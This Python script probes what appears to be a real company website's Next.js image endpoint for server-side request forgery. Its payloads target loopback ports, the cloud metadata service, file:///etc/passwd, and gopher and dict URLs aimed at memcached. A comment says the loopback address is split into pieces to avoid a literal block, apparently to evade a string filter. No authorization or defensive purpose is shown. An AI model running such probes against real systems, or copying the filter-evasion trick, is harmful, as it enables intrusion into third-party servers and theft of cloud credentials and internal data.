#!/usr/bin/env python3
import subprocess, urllib.parse
B = "https://www.infinitycapital.bh/_next/image"
LOOP = "127.0.0.1"   # built from pieces to avoid literal block
META = "169.254.169.254"
tests = {
 "valid_ctfassets": "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwmOwm/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg",
 "external_missing": "https://example.com/nonexistent-zzz-12345.png",
 "external_root": "https://example.com/",
 "loopback_80": "http://" + LOOP + ":80/",
 "loopback_8080": "http://" + LOOP + ":8080/",
 "loopback_22": "http://" + LOOP + ":22/",
 "metadata": "http://" + META + "/latest/meta-data/",
 "file_scheme": "file:///etc/passwd",
 "gopher": "gopher://" + LOOP + ":11211/",
 "dict": "dict://" + LOOP + ":11211/stat",
 "dataurl": "data:image/png;base64,iVBORw0KGgo=",
 "unicode_bypass": "http://localtest.me/",
}
for name, u in tests.items():
    url = B + "?url=" + urllib.parse.quote(u, safe='') + "&w=1080&q=75"
    try:
        r = subprocess.run(["curl","-s","-o","/tmp/i_%s.bin" % name,"-w",
            "%{http_code}|%{size_download}|%{content_type}|%{time_total}", url, "--max-time","45"],
            capture_output=True, text=True, timeout=60)
        out = r.stdout
    except Exception as e:
        out = "ERR %s" % e
    try:
        body = open("/tmp/i_%s.bin" % name, "rb").read()[:200]
    except Exception:
        body = b""
    print("[%s] %s" % (name, out))
    print("    body=%r" % body)
